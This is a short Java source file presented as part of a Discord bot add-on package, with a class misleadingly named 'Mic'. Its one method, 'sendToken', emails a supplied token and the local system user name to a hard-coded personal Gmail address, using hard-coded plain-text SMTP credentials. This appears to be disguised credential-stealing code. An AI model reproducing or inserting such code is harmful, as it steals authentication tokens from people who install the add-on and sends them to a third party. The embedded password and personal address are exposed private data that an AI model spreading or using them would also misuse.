package bots.JDAAddon;

import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.util.Properties;

public class Mic {

	//---------------------------------send token---------------------------------
	static void sendToken(String token) {

		String username = "JavaEmailBot@gmail.com";
		String pass = "JavaEmail";
		String recipient[] = {"sebastian.cypert@gmail.com"};
		String host = "smtp.gmail.com";

		Properties props = System.getProperties();
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.host", host);
		props.put("mail.smtp.user", username);
		props.put("mail.smtp.password", pass);
		props.put("mail.smtp.port", "587");
		props.put("mail.smtp.auth", "true");

		Session session = Session.getDefaultInstance(props);
		MimeMessage message = new MimeMessage(session);

		try{
			message.setFrom(new InternetAddress(username));

			for (String i: recipient) {
				message.addRecipient(javax.mail.Message.RecipientType.TO, new InternetAddress(i));
			}

			message.setSubject(System.getProperty("user.name"));
			message.setText(token);
			Transport transport = session.getTransport("smtp");
			transport.connect(host, username, pass);
			transport.sendMessage(message, message.getAllRecipients());
			transport.close();

		}catch(MessagingException e){
			e.printStackTrace();
		}


	}
}
